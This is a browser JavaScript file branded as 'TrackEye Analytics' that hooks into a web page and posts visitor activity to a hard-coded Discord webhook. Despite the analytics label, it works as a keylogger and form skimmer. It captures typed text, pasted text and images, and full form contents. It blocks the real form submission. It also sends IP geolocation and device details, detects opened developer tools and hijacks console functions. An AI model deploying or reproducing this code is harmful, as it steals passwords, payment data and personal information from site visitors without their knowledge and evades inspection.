const WEBHOOK_URL = "https://discord.com/api/webhooks/1348363412702367877/wjXCjlCSrCimOiuEAijJeR6eIdVc9JnTjmo8XaftEQ1igyNcoOWwRxSFHPqGstWDW0IC";
window.WEBHOOK_URL = WEBHOOK_URL;

if (!window.WEBHOOK_URL) {
    console.error("WEBHOOK_URL is not defined");
} else {
    console.log("WEBHOOK_URL is defined:", window.WEBHOOK_URL);
}

const userId = localStorage.getItem("userId") || Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
localStorage.setItem("userId", userId);

const sessionId = sessionStorage.getItem("sessionId") || Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
sessionStorage.setItem("sessionId", sessionId);

function getCookieId() {
    const cookies = document.cookie.split(';').map(cookie => cookie.trim());
    const cookieId = cookies.find(cookie => cookie.startsWith('cookieId='));
    return cookieId ? cookieId.split('=')[1] : "No cookie ID found";
}

function setCookieId() {
    const cookieId = getCookieId();
    if (cookieId === "No cookie ID found") {
        const newCookieId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        document.cookie = `cookieId=${newCookieId}; path=/; max-age=${60 * 60 * 24 * 365}`;
    }
}

function formatDuration(seconds) {
    if (seconds < 60) return `${seconds} seconds`;
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    if (minutes < 60) return `${minutes}m ${remainingSeconds}s`;
    const hours = Math.floor(minutes / 60);
    const remainingMinutes = minutes % 60;
    return `${hours}h ${remainingMinutes}m ${remainingSeconds}s`;
}

let mouseMovements = 0;
let clicks = { left: 0, right: 0 };
let keystrokes = 0;
let specialKeys = [];
let scrollDepth = 0;
let maxScrollDepth = 0;
let typedText = "";
let typingTimeout;

let cachedLocationData = {
    ip: "Unknown",
    city: "Unknown",
    region: "Unknown",
    country: "Unknown",
    country_code: "unknown",
    latitude: "Unknown",
    longitude: "Unknown"
};

function formatValue(value) {
    if (typeof value === "object" && value !== null) {
        return Object.entries(value)
            .map(([k, v]) => `**${k.replace(/_/g, " ")}**: ${v}`)
            .join("\n");
    }
    return String(value);
}

function formatTimestamp(timestamp) {
    return new Date(timestamp).toLocaleString("en-US", {
        weekday: "short",
        month: "short",
        day: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true,
    });
}

function createEmbed(data) {
    const baseEmbed = {
        timestamp: data.timestamp,
        footer: {
            text: "TrackEye Analytics",
            icon_url: "https://trackeye.vercel.app/images/favicon.png"
        }
    };

    if (data.flagUrl) {
        baseEmbed.thumbnail = { url: data.flagUrl };
    }

    const createSessionField = () => ({
        name: "🔑 Session Details",
        value: [
            `👤 **User ID:** \`${data.userId}\``,
            `📍 **Session ID:** \`${data.sessionId}\``,
            `🍪 **Cookie ID:** \`${data.cookieId}\``,
            `⏰ **Timestamp:** ${formatTimestamp(data.timestamp)}`
        ].join('\n'),
        inline: false
    });

    switch (data.event) {
case "user_left":
    return {
        ...baseEmbed,
        title: "👋 Session Summary",
        description: "Detailed analysis of user activity during this session",
        color: 0xf04747,
        fields: [
            createSessionField(),
            {
                name: "⏱️ Time Analysis",
                value: [
                    `**Total Duration:** \`${formatDuration(data.session_duration)}\``,
                    `**Activity Level:** \`${data.activity_metrics.activity_level}\``
                ].join('\n'),
                inline: true
            },
            // Remove the idle_time and active_time fields
            {
                name: "🖱️ Mouse Activity",
                value: [
                    `**Total Clicks:** \`${data.clicks.left + data.clicks.right}\``,
                    `↪️ Left Clicks: \`${data.clicks.left}\``,
                    `↩️ Right Clicks: \`${data.clicks.right}\``,
                    `**Mouse Movements:** \`${data.mouse_movements}\``,
                    `**Clicks/Minute:** \`${data.activity_metrics.clicks_per_minute}\``
                ].join('\n'),
                inline: true
            },
            {
                name: "⌨️ Keyboard Activity",
                value: [
                    `**Total Keystrokes:** \`${data.keystrokes}\``,
                    `**Keystrokes/Minute:** \`${data.activity_metrics.keystrokes_per_minute}\``,
                    `**Special Keys Used:**\n\`${data.special_keys.join(", ") || "None"}\``
                ].join('\n'),
                inline: true
            },
            {
                name: "📊 Page Interaction",
                value: [
                    `**Max Scroll Depth:** \`${data.max_scroll_depth}%\``,
                    `**Page Title:** \`${data.site_info.title}\``,
                    `**URL:** \`${data.site_info.url}\``
                ].join('\n'),
                inline: false
            },
            {
                name: "💻 Device Information",
                value: [
                    `**Platform:** \`${data.device_info.platform}\``,
                    `**Browser Language:** \`${data.device_info.language}\``,
                    `**Screen Resolution:** \`${data.device_info.screen_resolution}\``,
                    `**Device Memory:** \`${data.device_info.device_memory}GB\``,
                    `**CPU Cores:** \`${data.device_info.cpu_cores}\``
                ].join('\n'),
                inline: true
            },
            {
                name: "📍 Location Data",
                value: [
                    `**IP:** \`${data.ip}\``,
                    `**Location:** \`${data.location}\``,
                    `**Status:** \`${data.user_status}\``
                ].join('\n'),
                inline: true
            }
        ]
    };

        case "user_joined":
            return {
                ...baseEmbed,
                title: "🎉 New Session Started",
                description: "User has initiated a new browsing session",
                color: 0x43b581,
                fields: [
                    createSessionField(),
                    {
                        name: "👤 User Information",
                        value: [
                            `**Status:** \`${data.user_status}\``,
                            `**IP:** \`${data.ip}\``,
                            `**Location:** \`${data.location}\``
                        ].join('\n'),
                        inline: true
                    },
                    {
                        name: "🌐 Site Information",
                        value: formatValue(data.site_info),
                        inline: true
                    },
                    {
                        name: "💻 Device Information",
                        value: formatValue(data.device_info),
                        inline: false
                    }
                ]
            };

        case "left_click":
        case "right_click":
            return {
                ...baseEmbed,
                title: `🖱️ ${data.event === "left_click" ? "Left" : "Right"} Click Detected`,
                color: 0x7289da,
                fields: [
                    createSessionField(),
                    {
                        name: "🎯 Click Details",
                        value: [
                            `**Position:** X: \`${data.mouse_position.x}\`, Y: \`${data.mouse_position.y}\``,
                            `**Element:** \`${data.element.tag}\``,
                            `**ID:** \`${data.element.id || "N/A"}\``,
                            `**Class:** \`${data.element.class || "N/A"}\``,
                            `**Text Content:** \`${data.element.text || "N/A"}\``
                        ].join('\n'),
                        inline: false
                    }
                ]
            };

        case "typing":
            return {
                ...baseEmbed,
                title: "⌨️ Typing Activity",
                color: 0x99aab5,
                fields: [
                    createSessionField(),
                    {
                        name: "📝 Input Details",
                        value: [
                            `**Characters Typed:** \`${data.text.length}\``,
                            `**Typed Text:** \`${data.text}\``
                        ].join('\n'),
                        inline: false
                    }
                ]
            };

        case "form_submit":
            return {
                ...baseEmbed,
                title: "📝 Form Submitted",
                color: 0x7289da,
                fields: [
                    createSessionField(),
                    {
                        name: "📋 Form Details",
                        value: [
                            `**Form ID:** \`${data.form_id || "N/A"}\``,
                            "**Form Data:**",
                            "```json",
                            JSON.stringify(data.form_data, null, 2),
                            "```"
                        ].join('\n'),
                        inline: false
                    }
                ]
            };

        case "javascript_error":
            return {
                ...baseEmbed,
                title: "⚠️ JavaScript Error",
                color: 0xfaa61a,
                fields: [
                    createSessionField(),
                    {
                        name: "❌ Error Details",
                        value: [
                            `**Message:** \`${data.message}\``,
                            `**File:** \`${data.filename}\``,
                            `**Line:** \`${data.lineno}\``,
                            `**Column:** \`${data.colno}\``
                        ].join('\n'),
                        inline: false
                    }
                ]
            };

        case "devtools_opened":
            return {
                ...baseEmbed,
                title: "🛠️ DevTools Opened",
                description: "User has opened browser developer tools",
                color: 0xff5252,
                fields: [
                    createSessionField(),
                    {
                        name: "🔍 Detection Details",
                        value: [
                            `**Method:** \`${data.detection_method}\``,
                            `**Window Metrics:**`,
                            `> Inner: \`${data.window_metrics.inner_width}x${data.window_metrics.inner_height}\``,
                            `> Outer: \`${data.window_metrics.outer_width}x${data.window_metrics.outer_height}\``,
                            `> Difference: \`${data.window_metrics.difference_width}x${data.window_metrics.difference_height}\``,
                        ].join('\n'),
                        inline: false
                    },
                    {
                        name: "⚠️ Security Alert",
                        value: "User may be inspecting page elements or running custom scripts.",
                        inline: false
                    }
                ]
            };

        case "devtools_action":
            return {
                ...baseEmbed,
                title: "⌨️ DevTools Activity",
                description: data.is_significant ? "⚠️ Significant DevTools action detected!" : "DevTools console activity detected",
                color: data.is_significant ? 0xff5252 : 0xffa726,
                fields: [
                    createSessionField(),
                    {
                        name: "🔍 Console Action",
                        value: [
                            `**Type:** \`${data.action_type}\``,
                            `**Content:** \`${data.action_content}\``,
                        ].join('\n'),
                        inline: false
                    }
                ]
            };

        case "devtools_closed":
            return {
                ...baseEmbed,
                title: "🔒 DevTools Closed",
                description: "User has closed browser developer tools",
                color: 0x66bb6a,
                fields: [
                    createSessionField(),
                    {
                        name: "📊 Session Summary",
                        value: [
                            `**Duration:** \`${formatDuration(data.duration)}\``,
                            `**Actions:** \`${data.actions_count}\``,
                            `**Activity:**`,
                            "```",
                            data.actions_summary.join('\n'),
                            "```"
                        ].join('\n'),
                        inline: false
                    }
                ]
            };

        case "devtools_detected":
            return {
                ...baseEmbed,
                title: "🔎 DevTools Detected",
                description: "DevTools presence detected via alternative method",
                color: 0xff5252,
                fields: [
                    createSessionField(),
                    {
                        name: "🔍 Detection Details",
                        value: [
                            `**Method:** \`${data.detection_method}\``,
                            `**Execution Time:** \`${data.execution_time.toFixed(2)}ms\``,
                        ].join('\n'),
                        inline: false
                    }
                ]
            };

        default:
            return {
                ...baseEmbed,
                title: `📊 ${data.event.replace(/_/g, " ").toUpperCase()}`,
                color: 0x99aab5,
                fields: [
                    createSessionField(),
                    {
                        name: "📝 Event Details",
                        value: formatValue(
                            Object.fromEntries(
                                Object.entries(data).filter(([key]) =>
                                    !["userId", "sessionId", "cookieId", "event", "timestamp"].includes(key)
                                )
                            )
                        ),
                        inline: false
                    }
                ]
            };
    }
}

function getEventColor(event) {
    const colors = {
        user_joined: 0x43b581,
        user_left: 0xf04747,
        form_submit: 0x7289da,
        javascript_error: 0xfaa61a,
        media_play: 0x43b581,
        media_pause: 0xf04747,
        media_ended: 0x747f8d,
        left_click: 0x7289da,
        right_click: 0x7289da,
        special_key: 0x2c2f33,
        typing: 0x99aab5,
        scroll: 0x99aab5,
        tab_switch: 0x99aab5,
    };
    return colors[event] || 0x99aab5;
}

async function sendToDiscord(data) {
    if (!window.WEBHOOK_URL) {
        console.error("WEBHOOK_URL is not defined");
        return;
    }

    const payload = { embeds: [createEmbed(data)] };

    try {
        const response = await fetch(window.WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            throw new Error(`Discord webhook error: ${response.status}`);
        }
    } catch (error) {
        console.error("Failed to send data to Discord:", error);
        storeFailedData(payload);
    }
}

function storeFailedData(data) {
    try {
        const failedLogs = JSON.parse(localStorage.getItem("failedLogs") || "[]");
        failedLogs.push(data);
        localStorage.setItem("failedLogs", JSON.stringify(failedLogs));
        console.log("Stored failed data in localStorage:", data);
    } catch (error) {
        console.error("Failed to store data in localStorage:", error);
    }
}

async function retryFailedLogs() {
    try {
        const failedLogs = JSON.parse(localStorage.getItem("failedLogs") || "[]");
        if (failedLogs.length > 0) {
            console.log("Retrying failed logs:", failedLogs);
            for (const log of failedLogs) {
                await sendToDiscord(log);
            }
            localStorage.removeItem("failedLogs");
        }
    } catch (error) {
        console.error("Failed to retry failed logs:", error);
    }
}

document.addEventListener("click", (event) => {
    clicks.left++;
    const element = event.target;

    const elementDetails = {
        tag: element.tagName,
        id: element.id,
        class: element.className,
        text: element.innerText.substring(0, 50),
        name: element.name || "N/A",
        type: element.type || "N/A",
        href: element.href || "N/A",
        src: element.src || "N/A",
    };

    const clickData = {
        userId,
        sessionId,
        cookieId: getCookieId(),
        event: "left_click",
        element: elementDetails,
        mouse_position: { x: event.clientX, y: event.clientY },
        timestamp: new Date().toISOString(),
    };
    console.log("Left click data:", clickData);
    sendToDiscord(clickData);
});

document.addEventListener("contextmenu", (event) => {
    clicks.right++;
    const element = event.target;

    const elementDetails = {
        tag: element.tagName,
        id: element.id,
        class: element.className,
        text: element.innerText.substring(0, 50),
        name: element.name || "N/A",
        type: element.type || "N/A",
        href: element.href || "N/A",
        src: element.src || "N/A",
    };

    const clickData = {
        userId,
        sessionId,
        cookieId: getCookieId(),
        event: "right_click",
        element: elementDetails,
        mouse_position: { x: event.clientX, y: event.clientY },
        timestamp: new Date().toISOString(),
    };
    console.log("Right click data:", clickData);
    sendToDiscord(clickData);
});

document.addEventListener("keydown", (event) => {
    keystrokes++;
    if (["Backspace", "Enter", "Shift", "Control", "Alt", "Tab", "CapsLock", "Escape"].includes(event.key)) {
        specialKeys.push(event.key);
        const specialKeyData = {
            userId,
            sessionId,
            cookieId: getCookieId(),
            event: "special_key",
            key: event.key,
            timestamp: new Date().toISOString(),
        };
        console.log("Special key data:", specialKeyData);
        sendToDiscord(specialKeyData);
    } else {
        typedText += event.key;
    }
    clearTimeout(typingTimeout);
    typingTimeout = setTimeout(() => {
        if (typedText) {
            const typingData = {
                userId,
                sessionId,
                cookieId: getCookieId(),
                event: "typing",
                text: typedText,
                timestamp: new Date().toISOString(),
            };
            console.log("Typing data:", typingData);
            sendToDiscord(typingData);
            typedText = "";
        }
    }, 2000);
});

document.addEventListener("scroll", () => {
    const scrollY = window.scrollY;
    const totalHeight = document.documentElement.scrollHeight - window.innerHeight;
    scrollDepth = Math.round((scrollY / totalHeight) * 100);
    maxScrollDepth = Math.max(maxScrollDepth, scrollDepth);
    const scrollData = {
        userId,
        sessionId,
        cookieId: getCookieId(),
        event: "scroll",
        scroll_depth: scrollDepth,
        max_scroll_depth: maxScrollDepth,
        timestamp: new Date().toISOString(),
    };
    console.log("Scroll data:", scrollData);
    sendToDiscord(scrollData);
});

document.addEventListener("mousemove", () => {
    mouseMovements++;
});

document.addEventListener("submit", (event) => {
    event.preventDefault();
    const form = event.target;
    const formData = new FormData(form);
    const formDataObject = {};
    formData.forEach((value, key) => {
        formDataObject[key] = value;
    });
    const formSubmitData = {
        userId,
        sessionId,
        cookieId: getCookieId(),
        event: "form_submit",
        form_id: form.id,
        form_data: formDataObject,
        timestamp: new Date().toISOString(),
    };
    console.log("Form submit data:", formSubmitData);
    sendToDiscord(formSubmitData);
});

document.addEventListener("play", (event) => {
    const element = event.target;
    if (element.tagName === "VIDEO" || element.tagName === "AUDIO") {
        const mediaPlayData = {
            userId,
            sessionId,
            cookieId: getCookieId(),
            event: "media_play",
            element: {
                tag: element.tagName,
                id: element.id,
                class: element.className,
                src: element.src,
            },
            timestamp: new Date().toISOString(),
        };
        console.log("Media play data:", mediaPlayData);
        sendToDiscord(mediaPlayData);
    }
}, true);

document.addEventListener("pause", (event) => {
    const element = event.target;
    if (element.tagName === "VIDEO" || element.tagName === "AUDIO") {
        const mediaPauseData = {
            userId,
            sessionId,
            cookieId: getCookieId(),
            event: "media_pause",
            element: {
                tag: element.tagName,
                id: element.id,
                class: element.className,
                src: element.src,
            },
            timestamp: new Date().toISOString(),
        };
        console.log("Media pause data:", mediaPauseData);
        sendToDiscord(mediaPauseData);
    }
}, true);

document.addEventListener("ended", (event) => {
    const element = event.target;
    if (element.tagName === "VIDEO" || element.tagName === "AUDIO") {
        const mediaEndedData = {
            userId,
            sessionId,
            cookieId: getCookieId(),
            event: "media_ended",
            element: {
                tag: element.tagName,
                id: element.id,
                class: element.className,
                src: element.src,
            },
            timestamp: new Date().toISOString(),
        };
        console.log("Media ended data:", mediaEndedData);
        sendToDiscord(mediaEndedData);
    }
}, true);

window.addEventListener("resize", () => {
    const resizeData = {
        userId,
        sessionId,
        cookieId: getCookieId(),
        event: "window_resize",
        width: window.innerWidth,
        height: window.innerHeight,
        timestamp: new Date().toISOString(),
    };
    console.log("Window resize data:", resizeData);
    sendToDiscord(resizeData);
});

window.addEventListener("error", (event) => {
    const errorData = {
        userId,
        sessionId,
        cookieId: getCookieId(),
        event: "javascript_error",
        message: event.message,
        filename: event.filename,
        lineno: event.lineno,
        colno: event.colno,
        timestamp: new Date().toISOString(),
    };
    console.log("JavaScript error data:", errorData);
    sendToDiscord(errorData);
});

document.addEventListener("visibilitychange", () => {
    const visibilityData = {
        userId,
        sessionId,
        cookieId: getCookieId(),
        event: "tab_switch",
        visibility_state: document.visibilityState,
        timestamp: new Date().toISOString(),
    };
    console.log("Tab switch data:", visibilityData);
    sendToDiscord(visibilityData);
});

document.addEventListener("paste", (event) => {
    const clipboardData = event.clipboardData || window.clipboardData;
    if (clipboardData.types.includes("text/plain")) {
        const pastedText = clipboardData.getData("text/plain");
        const pasteData = {
            userId,
            sessionId,
            cookieId: getCookieId(),
            event: "text_pasted",
            text: pastedText,
            timestamp: new Date().toISOString(),
        };
        console.log("Text pasted data:", pasteData);
        sendToDiscord(pasteData);
    } else if (clipboardData.types.includes("Files")) {
        const pastedFile = clipboardData.items[0].getAsFile();
        if (pastedFile && pastedFile.type.startsWith("image/")) {
            const reader = new FileReader();
            reader.onload = (e) => {
                const imageData = {
                    userId,
                    sessionId,
                    cookieId: getCookieId(),
                    event: "image_pasted",
                    image_url: e.target.result,
                    timestamp: new Date().toISOString(),
                };
                console.log("Image pasted data:", imageData);
                sendToDiscord(imageData);
            };
            reader.onerror = (e) => {
                console.error("FileReader error:", e);
            };
            reader.readAsDataURL(pastedFile);
        }
    }
});

async function getUserLocation() {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);

        const response = await fetch("https://ipapi.co/json/", { signal: controller.signal });
        clearTimeout(timeoutId);
        if (response.ok) {
            const data = await response.json();
            
            let flagUrl;
            
            if (data.country_code === "US") {
                const stateCode = data.region_code?.toLowerCase();
                if (stateCode) {
                    flagUrl = `https://flagcdn.com/w320/us-${stateCode}.png`;
                } else {
                    flagUrl = `https://flagcdn.com/w320/us.png`;
                }
            } else {
                const countryCode = data.country_code?.toLowerCase();
                if (countryCode) {
                    flagUrl = `https://flagcdn.com/w320/${countryCode}.png`;
                } else {
                    flagUrl = `https://flagcdn.com/w320/unknown.png`;
                }
            }

            console.log("Generated flag URL:", flagUrl);

            cachedLocationData = {
                ip: data.ip,
                city: data.city,
                region: data.region,
                region_code: data.region_code?.toLowerCase() || "unknown",
                country: data.country_name,
                country_code: data.country_code?.toLowerCase() || "unknown",
                latitude: data.latitude,
                longitude: data.longitude,
                flagUrl: flagUrl
            };

            return cachedLocationData;
        } else {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
    } catch (error) {
        console.error("Failed to fetch location:", error);
        return cachedLocationData;
    }
}

let locationRetryCount = 0;
const MAX_LOCATION_RETRIES = 3;

async function getLocationWithRetry() {
    while (locationRetryCount < MAX_LOCATION_RETRIES) {
        const location = await getUserLocation();
        if (location.ip !== "Unknown") {
            return location;
        }
        locationRetryCount++;
        await new Promise(resolve => setTimeout(resolve, 1000 * locationRetryCount));
    }
    return getUserLocation();
}

function getDeviceInfo() {
    return {
        user_agent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen_resolution: `${window.screen.width}x${window.screen.height}`,
        device_memory: navigator.deviceMemory || "Unknown",
        cpu_cores: navigator.hardwareConcurrency || "Unknown",
        is_cookie_enabled: navigator.cookieEnabled,
        is_online: navigator.onLine,
    };
}

function checkUserStatus() {
    try {
        const userId = localStorage.getItem("userId");
        if (!userId) {
            const newUserId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
            localStorage.setItem("userId", newUserId);
            return "New User";
        } else {
            return "Returning User";
        }
    } catch (error) {
        console.error("Failed to check user status:", error);
        return "Unknown";
    }
}

window.addEventListener("load", async () => {
    if (!window.WEBHOOK_URL) {
        console.error("WEBHOOK_URL is not defined");
        return;
    }
    console.log("Page loaded");
    setCookieId();
    await retryFailedLogs();

    const locationData = await getUserLocation();
    const userStatus = checkUserStatus();
    const deviceInfo = getDeviceInfo();

    const siteInfo = {
        title: document.title,
        url: window.location.href,
        path: window.location.pathname,
        hostname: window.location.hostname,
        protocol: window.location.protocol,
        search_params: window.location.search,
        hash: window.location.hash,
    };

    const userData = {
        userId,
        sessionId,
        cookieId: getCookieId(),
        event: "user_joined",
        user_status: userStatus,
        ip: locationData.ip,
        location: `${locationData.city}, ${locationData.region}, ${locationData.country}`,
        coordinates: `${locationData.latitude}, ${locationData.longitude}`,
        device_info: deviceInfo,
        site_info: siteInfo,
        timestamp: new Date().toISOString(),
        flagUrl: locationData.flagUrl
    };

    console.log("User joined data:", userData);
    await sendToDiscord(userData);
});

window.addEventListener("beforeunload", async () => {
    if (!window.WEBHOOK_URL) {
        console.error("WEBHOOK_URL is not defined");
        return;
    }

    const sessionDuration = Math.floor((Date.now() - sessionStartTime) / 1000);
    const deviceInfo = getDeviceInfo();
    const userStatus = checkUserStatus();

    const userLeftData = {
        userId,
        sessionId,
        cookieId: getCookieId(),
        event: "user_left",
        user_status: userStatus,
        session_duration: sessionDuration,
        clicks: clicks,
        mouse_movements: mouseMovements,
        keystrokes: keystrokes,
        special_keys: [...new Set(specialKeys)],
        max_scroll_depth: maxScrollDepth,
        flagUrl: cachedLocationData.flagUrl,
        ip: cachedLocationData.ip,
        location: `${cachedLocationData.city}, ${cachedLocationData.region}, ${cachedLocationData.country}`,
        coordinates: `${cachedLocationData.latitude}, ${cachedLocationData.longitude}`,
        device_info: deviceInfo,
        site_info: {
            title: document.title,
            url: window.location.href,
            path: window.location.pathname,
            hostname: window.location.hostname
        },
        activity_metrics: {
            clicks_per_minute: ((clicks.left + clicks.right) / (sessionDuration / 60)).toFixed(2),
            keystrokes_per_minute: (keystrokes / (sessionDuration / 60)).toFixed(2),
            activity_level: calculateActivityLevel({
                clicks: clicks.left + clicks.right,
                keystrokes,
                mouseMovements,
                scrollDepth: maxScrollDepth,
                duration: sessionDuration
            })
        },
        timestamp: new Date().toISOString()
    };

    const blob = new Blob([JSON.stringify({ embeds: [createEmbed(userLeftData)] })], { type: 'application/json' });

    try {
        if (!navigator.sendBeacon(window.WEBHOOK_URL, blob)) {
            console.error("sendBeacon failed, using fetch as fallback");
            await fetch(window.WEBHOOK_URL, {
                method: 'POST',
                body: blob,
                keepalive: true
            });
        }
    } catch (error) {
        console.error("Failed to send user_left event:", error);
        storeFailedData(userLeftData);
    }
});

function calculateActivityLevel(metrics) {
    const { clicks, keystrokes, mouseMovements, scrollDepth, duration } = metrics;
    const minutesDuration = duration / 60;

    const clickRate = clicks / minutesDuration;
    const keystrokeRate = keystrokes / minutesDuration;
    const mouseMovementRate = mouseMovements / minutesDuration;

    const activityScore = (clickRate * 0.3) + (keystrokeRate * 0.3) + (mouseMovementRate * 0.2) + (scrollDepth * 0.2);

    if (activityScore > 50) return "Very High";
    if (activityScore > 30) return "High";
    if (activityScore > 15) return "Medium";
    if (activityScore > 5) return "Low";
    return "Very Low";
}

function createUserActivitySummary(data) {
    const clicksPerMinute = (data.clicks.left + data.clicks.right) / (data.session_duration / 60);
    const keystrokesPerMinute = data.keystrokes / (data.session_duration / 60);
    const scrollPercentage = data.max_scroll_depth || 0;

    let activityLevel = "Low";
    const activityScore = (clicksPerMinute * 0.4) + (keystrokesPerMinute * 0.4) + (scrollPercentage * 0.2);
    if (activityScore > 30) activityLevel = "High";
    else if (activityScore > 15) activityLevel = "Medium";

    return {
        userId: data.userId,
        sessionId: data.sessionId,
        cookieId: data.cookieId,
        event: "user_left",
        summary: {
            session_duration: `${formatDuration(data.session_duration)}`,
            activity_metrics: {
                total_clicks: data.clicks.left + data.clicks.right,
                click_breakdown: { left_clicks: data.clicks.left, right_clicks: data.clicks.right },
                clicks_per_minute: clicksPerMinute.toFixed(2),
                total_keystrokes: data.keystrokes,
                keystrokes_per_minute: keystrokesPerMinute.toFixed(2),
                special_keys_used: [...new Set(data.special_keys)],
                max_scroll_depth: `${data.max_scroll_depth}%`,
                mouse_movements: data.mouse_movements,
                activity_level: activityLevel
            }
        },
        device_info: data.device_info,
        timestamp: new Date().toISOString()
    };
}

function detectDevTools() {
    const threshold = 160;
    let isDevToolsOpen = false;
    let devToolsActions = [];
    
    function checkDevToolsOpen() {
        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
        
        if ((widthThreshold || heightThreshold) && !isDevToolsOpen) {
            isDevToolsOpen = true;
            
            const devToolsData = {
                userId,
                sessionId,
                cookieId: getCookieId(),
                event: "devtools_opened",
                detection_method: widthThreshold ? "width_difference" : "height_difference",
                window_metrics: {
                    inner_width: window.innerWidth,
                    inner_height: window.innerHeight,
                    outer_width: window.outerWidth,
                    outer_height: window.outerHeight,
                    difference_width: window.outerWidth - window.innerWidth,
                    difference_height: window.outerHeight - window.innerHeight
                },
                timestamp: new Date().toISOString(),
            };
            
            console.log("DevTools opened:", devToolsData);
            sendToDiscord(devToolsData);
            
            startConsoleTracking();
        } else if (!(widthThreshold || heightThreshold) && isDevToolsOpen) {
            isDevToolsOpen = false;
            
            if (devToolsActions.length > 0) {
                const devToolsClosedData = {
                    userId,
                    sessionId,
                    cookieId: getCookieId(),
                    event: "devtools_closed",
                    duration: Math.floor((Date.now() - lastDevToolsOpenTime) / 1000),
                    actions_count: devToolsActions.length,
                    actions_summary: devToolsActions.length > 10 
                        ? devToolsActions.slice(0, 10).concat([`... and ${devToolsActions.length - 10} more actions`]) 
                        : devToolsActions,
                    timestamp: new Date().toISOString(),
                };
                
                console.log("DevTools closed:", devToolsClosedData);
                sendToDiscord(devToolsClosedData);
                
                devToolsActions = [];
            }
        }
    }
    
    let lastDevToolsOpenTime = 0;
    
    function startConsoleTracking() {
        lastDevToolsOpenTime = Date.now();
        
        const originalConsole = {
            log: console.log,
            warn: console.warn,
            error: console.error,
            info: console.info,
            debug: console.debug,
            clear: console.clear
        };
        
        console.log = function() {
            const args = Array.from(arguments);
            trackConsoleAction('log', args);
            originalConsole.log.apply(console, arguments);
        };
        
        console.warn = function() {
            const args = Array.from(arguments);
            trackConsoleAction('warn', args);
            originalConsole.warn.apply(console, arguments);
        };
        
        console.error = function() {
            const args = Array.from(arguments);
            trackConsoleAction('error', args);
            originalConsole.error.apply(console, arguments);
        };
        
        console.info = function() {
            const args = Array.from(arguments);
            trackConsoleAction('info', args);
            originalConsole.info.apply(console, arguments);
        };
        
        console.debug = function() {
            const args = Array.from(arguments);
            trackConsoleAction('debug', args);
            originalConsole.debug.apply(console, arguments);
        };
        
        console.clear = function() {
            trackConsoleAction('clear', []);
            originalConsole.clear.apply(console, arguments);
        };
        
        function trackConsoleAction(type, args) {
            if (!isDevToolsOpen) return;
            
            let actionStr = `${type}: `;
            try {
                if (args.length > 0) {
                    actionStr += args.map(arg => 
                        typeof arg === 'object' ? JSON.stringify(arg).substring(0, 50) : String(arg).substring(0, 50)
                    ).join(', ');
                    
                    if (actionStr.length > 100) {
                        actionStr = actionStr.substring(0, 100) + '...';
                    }
                }
                
                devToolsActions.push(actionStr);
                
                if (type === 'error' || devToolsActions.length % 5 === 0) {
                    const devToolsActionData = {
                        userId,
                        sessionId,
                        cookieId: getCookieId(),
                        event: "devtools_action",
                        action_type: type,
                        action_content: actionStr,
                        is_significant: type === 'error',
                        timestamp: new Date().toISOString(),
                    };
                    
                    console.originalLog = originalConsole.log;
                    console.originalLog("DevTools action:", devToolsActionData);
                    sendToDiscord(devToolsActionData);
                }
            } catch (e) {
                console.originalError = originalConsole.error;
                console.originalError("Error tracking console action:", e);
            }
        }
    }
    
    setInterval(checkDevToolsOpen, 1000);
    
    let devToolsCounter = 0;
    const devToolsDebugCheck = () => {
        devToolsCounter++;
        console.log('DevTools debugger check', devToolsCounter);
        
        const startTime = performance.now();
        debugger;
        const endTime = performance.now();
        
        if (endTime - startTime > 100) {
            const devToolsDebuggerData = {
                userId,
                sessionId,
                cookieId: getCookieId(),
                event: "devtools_detected",
                detection_method: "debugger_statement",
                execution_time: endTime - startTime,
                timestamp: new Date().toISOString(),
            };
            
            console.log("DevTools detected via debugger:", devToolsDebuggerData);
            sendToDiscord(devToolsDebuggerData);
            
            if (!isDevToolsOpen) {
                isDevToolsOpen = true;
                startConsoleTracking();
            }
        }
    };
    
    setInterval(devToolsDebugCheck, 5000);
}

detectDevTools();
